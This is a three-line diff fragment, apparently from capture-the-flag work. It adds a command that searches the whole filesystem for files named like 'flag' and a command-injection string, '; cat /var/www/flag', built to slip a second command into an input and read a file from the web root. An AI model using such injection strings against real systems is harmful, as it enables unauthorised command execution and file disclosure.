@@ -1,0 +1,3 @@
+find / -type f -name '*flag*' 
+
+; cat /var/www/flag
